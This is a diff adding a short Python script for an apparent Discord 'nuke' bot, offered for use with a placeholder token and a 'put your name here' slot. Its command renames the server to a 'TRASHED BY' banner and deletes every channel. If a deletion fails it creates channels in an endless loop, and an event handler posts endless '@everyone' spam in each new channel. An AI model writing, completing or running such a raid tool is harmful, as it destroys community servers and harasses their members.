@@ -1,0 +1,34 @@
+import discord
+from discord.ext import commands
+
+client = commands.Bot(command_prefix=".",
+                     intents=discord.Intents.all()) # client
+
+# events
+@client.event
+async def on_ready():
+    print("Logged in as {}" .format(client.user))
+
+# main commands
+@client.command()
+async def nuke(ctx):
+    await ctx.guild.edit(name="TRASHED BY saint069 (put your name here)")
+    try:
+        for channels in ctx.guild.channels:
+            await channels.delete()
+            print("deleted {}" .format(channels))
+    except:
+        print("Cant delete {}" .format(channels))
+
+        while True:
+            await ctx.guild.create_text_channel("saint069 op porra")
+
+# pings
+@client.event
+async def on_guild_channel_create(channel):
+    while True:
+        await channel.send("@everyone siga saint069 on tiktok")
+
+# making the client run
+
+client.run("your token bot")
